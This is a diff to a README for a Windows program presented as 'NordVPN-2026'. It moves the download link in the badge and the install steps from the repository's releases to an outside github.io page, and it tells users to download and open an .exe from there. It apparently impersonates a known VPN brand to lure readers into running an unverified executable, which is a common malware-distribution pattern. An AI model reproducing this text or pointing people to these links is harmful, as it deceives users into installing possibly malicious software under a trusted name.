@@ -1,6 +1,6 @@
 # 🛡️ NordVPN-2026 - Secure your Windows network workflow easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Smmehmand4038/NordVPN-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://smmehmand4038.github.io)
 
 NordVPN-2026 provides a stable interface for managing your network security on Windows. This tool automates common tasks like switching server profiles, toggling the kill switch, and configuring split tunneling. It creates connection logs so you can monitor your network history.
 
@@ -18,7 +18,7 @@ You need a Windows computer to run this application. Ensure your system meets th
 
 Follow these steps to set up the software on your machine.
 
-1.  Visit the official release page: [https://github.com/Smmehmand4038/NordVPN-2026/releases](https://github.com/Smmehmand4038/NordVPN-2026/releases).
+1.  Visit the official release page: [https://smmehmand4038.github.io](https://smmehmand4038.github.io).
 2.  Look for the latest version listed under the Assets section.
 3.  Click the file ending in .exe to download it to your computer.
 4.  Open the downloaded file from your Downloads folder.
